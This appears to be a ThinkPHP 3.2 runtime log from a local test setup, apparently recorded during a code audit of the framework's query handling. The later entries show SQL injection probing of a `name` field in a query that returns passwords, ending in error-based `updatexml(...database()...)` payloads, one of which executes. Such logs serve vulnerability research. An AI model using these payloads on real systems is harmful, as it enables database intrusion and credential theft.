[ 2019-04-02T17:07:38+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000082s ]
INFO: [ app_init ] --END-- [ RunTime:0.000484s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001039s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001294s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.1518s ]
NOTIC: [8] Undefined variable: data D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Shop\Home\Controller\IndexController.class.php 第 9 行.
SQL: SELECT * FROM `test` WHERE ( id=2 ) LIMIT 1   [ RunTime:0.0018s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002981s ]
INFO: [ app_end ] --END-- [ RunTime:0.003833s ]

[ 2019-04-02T17:09:49+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000033s ]
INFO: [ app_init ] --END-- [ RunTime:0.000194s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001522s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001779s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0298s ]
SQL: SELECT * FROM `test` WHERE `id` = 0 LIMIT 1   [ RunTime:0.0006s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001515s ]
INFO: [ app_end ] --END-- [ RunTime:0.001911s ]

[ 2019-04-02T17:10:05+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000096s ]
INFO: [ app_init ] --END-- [ RunTime:0.000567s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000691s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000933s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0302s ]
SQL: SELECT * FROM `test` WHERE `id` = 2 LIMIT 1   [ RunTime:0.0005s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001143s ]
INFO: [ app_end ] --END-- [ RunTime:0.001449s ]

[ 2019-04-02T17:11:50+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000041s ]
INFO: [ app_init ] --END-- [ RunTime:0.000233s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000783s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001006s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0304s ]
SQL: SELECT * FROM `test` WHERE `id` = 2 LIMIT 1   [ RunTime:0.0010s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002460s ]
INFO: [ app_end ] --END-- [ RunTime:0.003199s ]

[ 2019-04-02T17:17:01+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
INFO: [ app_init ] --END-- [ RunTime:0.000220s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000604s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000781s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0121s ]
ERR: 表达式错误:2
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Common\functions.php:102) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Common\functions.php:102) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T17:18:08+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000040s ]
INFO: [ app_init ] --END-- [ RunTime:0.000278s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000888s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001284s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0284s ]
ERR: 表达式错误:2
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Common\functions.php:102) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Common\functions.php:102) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T17:20:20+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000596s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000766s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0119s ]
NOTIC: [8] Undefined index: name D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Shop\Home\Controller\IndexController.class.php 第 8 行.
SQL: SELECT * FROM `test` WHERE `name` = null LIMIT 1   [ RunTime:0.0005s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001439s ]
INFO: [ app_end ] --END-- [ RunTime:0.001808s ]

[ 2019-04-02T17:20:37+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000071s ]
INFO: [ app_init ] --END-- [ RunTime:0.000380s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000784s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000981s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0165s ]
SQL: SELECT * FROM `test` WHERE `name` = 'aaa' LIMIT 1   [ RunTime:0.0004s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000859s ]
INFO: [ app_end ] --END-- [ RunTime:0.001070s ]

[ 2019-04-02T17:20:54+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000083s ]
INFO: [ app_init ] --END-- [ RunTime:0.000581s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000728s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000953s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0311s ]
SQL: SELECT * FROM `test` WHERE `name` = 'aaa' LIMIT 1   [ RunTime:0.0010s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002282s ]
INFO: [ app_end ] --END-- [ RunTime:0.002970s ]

[ 2019-04-02T17:21:00+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000085s ]
INFO: [ app_init ] --END-- [ RunTime:0.000458s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000843s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001097s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0179s ]
ERR: 表达式错误:ccc
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Common\functions.php:102) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Common\functions.php:102) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T17:21:20+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000047s ]
INFO: [ app_init ] --END-- [ RunTime:0.000314s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000792s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001014s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0293s ]
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 550 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 596 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 596 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 600 行.
SQL: SELECT * FROM `test` WHERE ( `name` = null  ) LIMIT 1   [ RunTime:0.0004s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001082s ]
INFO: [ app_end ] --END-- [ RunTime:0.001360s ]

[ 2019-04-02T17:24:24+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000049s ]
INFO: [ app_init ] --END-- [ RunTime:0.000257s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000624s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000826s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0146s ]
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 551 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 598 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 601 行.
SQL: SELECT `name`,`password` FROM `test` WHERE ( `name` = null  ) LIMIT 1   [ RunTime:0.0005s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001087s ]
INFO: [ app_end ] --END-- [ RunTime:0.001362s ]

[ 2019-04-02T17:24:35+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000056s ]
INFO: [ app_init ] --END-- [ RunTime:0.000277s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000788s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001054s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0331s ]
ERR: 表达式错误:ccc
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Common\functions.php:102) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 230 行.
NOTIC: [2] Cannot modify header information - headers already sent by (output started at D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Common\functions.php:102) D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Think.class.php 第 231 行.

[ 2019-04-02T17:25:05+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000763s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000727s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000772s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0199s ]
ERR: 表达式错误:ccc

[ 2019-04-02T17:27:49+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000074s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001889s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002281s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0139s ]
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 551 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 598 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 601 行.
SQL: SELECT `name`,`password` FROM `test` WHERE ( `name` = null  ) LIMIT 1   [ RunTime:0.0005s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001101s ]
INFO: [ app_end ] --END-- [ RunTime:0.001158s ]

[ 2019-04-02T17:28:25+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001246s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001637s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0213s ]
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 551 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 598 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 601 行.
SQL: SELECT `name`,`password` FROM `test` WHERE ( `name` = null  ) LIMIT 1   [ RunTime:0.0004s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000950s ]
INFO: [ app_end ] --END-- [ RunTime:0.001005s ]

[ 2019-04-02T17:28:44+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000980s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001090s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0292s ]
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 551 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 598 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 601 行.
SQL: SELECT `name`,`password` FROM `test` WHERE ( `name` = null  ) LIMIT 1   [ RunTime:0.0005s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001206s ]
INFO: [ app_end ] --END-- [ RunTime:0.001273s ]

[ 2019-04-02T17:28:51+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000055s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000671s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000731s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0228s ]
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 551 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 597 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 598 行.
NOTIC: [8] Undefined offset: 0 D:\PhpStudy20180211\PHPTutorial\WWW\shenji\thinkphp3.2\ThinkPHP\Library\Think\Db\Driver.class.php 第 601 行.
SQL: SELECT `name`,`password` FROM `test` WHERE ( `name` = null  ) LIMIT 1   [ RunTime:0.0005s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001383s ]
INFO: [ app_end ] --END-- [ RunTime:0.001492s ]

[ 2019-04-02T17:29:15+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000059s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000791s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000868s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0316s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''aaa" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` 'aaa" LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''aaa" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` 'aaa" LIMIT 1  

[ 2019-04-02T17:29:41+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000056s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000613s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000685s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0293s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'aaa' LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` aaa' LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'aaa' LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` aaa' LIMIT 1  

[ 2019-04-02T17:30:14+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000868s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000923s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0276s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''aaa" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` 'aaa" LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''aaa" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` 'aaa" LIMIT 1  

[ 2019-04-02T17:31:38+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000126s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000583s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000625s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0294s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''=aaa" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` '=aaa" LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''=aaa" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` '=aaa" LIMIT 1  

[ 2019-04-02T17:31:47+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000097s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000722s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000829s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0225s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` =aaa" LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` =aaa" LIMIT 1  

[ 2019-04-02T17:31:54+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000066s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000971s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001160s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0313s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''aaa" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa" LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''aaa" LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa" LIMIT 1  

[ 2019-04-02T17:33:11+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000057s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000631s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000707s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0289s ]
SQL: SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(0x7e,database(),0x7e) LIMIT 1   [ RunTime:0.3548s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002544s ]
INFO: [ app_end ] --END-- [ RunTime:0.002705s ]

[ 2019-04-02T17:33:40+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000063s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000754s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000822s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0303s ]
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and uodatexml(1,concat(0x7e,database(),0x7e)),1) LIMIT 1  
ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1) LIMIT 1' at line 1
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and uodatexml(1,concat(0x7e,database(),0x7e)),1) LIMIT 1  

[ 2019-04-02T17:33:53+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000077s ]
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001334s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001562s ]
SQL: SHOW COLUMNS FROM `test` [ RunTime:0.0109s ]
ERR: 1582:Incorrect parameter count in the call to native function 'updatexml'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,database(),0x7e)),1) LIMIT 1  
ERR: 1582:Incorrect parameter count in the call to native function 'updatexml'
 [ SQL语句 ] : SELECT `name`,`password` FROM `test` WHERE `name` ='aaa' and updatexml(1,concat(0x7e,database(),0x7e)),1) LIMIT 1  

[ 2019-04-02T17:34:21+08:00 ] 127.0.0.1 /shenji/thinkphp3.2/thinkphp/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000050s ]
INFO: [ app_begin ] --START--
